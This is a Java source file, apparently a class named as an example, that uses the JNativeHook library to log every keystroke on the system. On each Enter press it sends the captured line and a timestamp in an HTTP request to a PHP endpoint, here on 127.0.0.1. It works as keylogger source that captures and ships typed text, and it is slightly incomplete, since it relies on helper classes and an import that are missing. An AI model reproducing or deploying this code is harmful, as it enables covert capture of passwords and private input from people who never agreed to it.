

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;


public class GlobalKeyListenerExample implements NativeKeyListener{
	public File file;
	public String text="";
	
	public GlobalKeyListenerExample() {
		
	}
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new GlobalKeyListenerExample());

	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	//trap space event and convert in blank carapter	
		if (e.getKeyCode() == 57) {
			//text=text + " ";
			text=text + "%20";
		}
		else if (e.getKeyCode() == 28) { //grab enter code
			text=text ;
		}
		else
		text=text + NativeKeyEvent.getKeyText(e.getKeyCode());
		//System.out.println(e.getKeyCode() + " " + NativeKeyEvent.VC_ENTER);
	//trap enter event and send as single line to text file of append	
		if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
			DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
			Date date = new Date();
			//System.out.println(dateFormat.format(date)); //2016/11/16 12:08:43
			
		file=new File(dateFormat.format(date)+text);
		/*HttpPost httpPost=new HttpPost();
		try {
			httpPost.sendPost("https://127.0.0.1:81/test/writefile.php", "text_="+text);
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			System.out.println(e1);
			e1.printStackTrace();
		}
		*/
		
		HttpGet httpGet=new HttpGet();
		try {
			httpGet.sendGet("http://127.0.0.1:81/test/writefileget.php"+ "?text_="+Long.toString(date.getTime())+"}"+text);
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			System.out.println(e1);
			e1.printStackTrace();
		}
		text="";
		}
		
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
			if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
				try {
					GlobalScreen.unregisterNativeHook();
				} catch (NativeHookException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	}

}
